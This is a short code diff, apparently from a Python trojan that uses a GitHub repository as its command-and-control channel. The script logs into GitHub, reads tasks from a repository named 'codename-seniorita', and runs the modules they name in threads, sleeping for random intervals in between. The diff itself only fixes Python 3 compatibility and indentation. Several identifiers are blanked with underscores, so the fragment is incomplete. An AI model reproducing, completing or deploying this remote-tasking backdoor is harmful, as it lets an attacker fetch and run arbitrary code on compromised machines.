@@ -5,7 +5,7 @@ import time
 import imp
 import random
 import threading
-import Queue
+import queue as Queue
 import os
 import _____
 from github3 import login
@@ -39,7 +39,7 @@ class HubHandler:
     def connect(self):
         " Connect to github and get the repository "
         gh = _____.______________(login)
-	self.username = gh.me().login
+        self.username = gh.me().login
         repo = gh.repository(self.username,"codename-seniorita")
         branch = repo.branch("master")
         return gh, repo, branch
@@ -108,4 +108,4 @@ while True:
         t = threading.Thread(target=module_runner, args=(task['module'], ghandle, task_queue)
         t.start()
         time.sleep(random.randint(1,10))
-    time.sleep(random.randint(1000, 100000)
+    time.sleep(random.randint(1000, 100000))
